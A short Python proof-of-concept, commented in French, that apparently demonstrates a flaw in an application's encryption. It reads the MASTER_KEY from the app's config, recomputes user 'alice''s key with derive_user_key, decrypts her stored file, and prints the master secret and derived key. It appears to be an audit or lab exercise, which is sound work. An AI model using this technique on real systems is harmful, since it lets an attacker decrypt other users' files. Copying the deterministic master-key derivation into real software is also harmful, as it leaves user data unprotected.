import sys
from pathlib import Path

ROOT_DIR = Path(__file__).resolve().parent.parent
sys.path.append(str(ROOT_DIR))

from app.config import MASTER_KEY
from app.crypto_utils import derive_user_key,decrypt_bytes

def exploit_f2(target_username: str,ciphertext_blob: bytes) -> bytes:
    """
    Recalcule la cle de chiffrement de la victime a partir de MASTER_KEY
    et de son nom d’utilisateur, puis dechiffre le fichier cible.
    """
    # 1. Calcul deterministe de la cle symetrique de la victime
    stolen_key = derive_user_key(target_username)
    
    # 2. Dechiffrement direct du fichier vole dans STORAGE
    plaintext = decrypt_bytes(ciphertext_blob, stolen_key)
    
    return plaintext

if __name__ == "__main__":
    target_user = "alice"
    calculated_key = derive_user_key(target_user)
    
    print(f"[+] Secret maitre recupere (config.py) : {MASTER_KEY}")
    print(f"[+] Cle calculee pour l’utilisateur ’{target_user}’ : {calculated_key.hex()}")
    print("[+] L’attaquant peut dechiffrer tous les fichiers de STORAGE associes a cet utilisateur.")

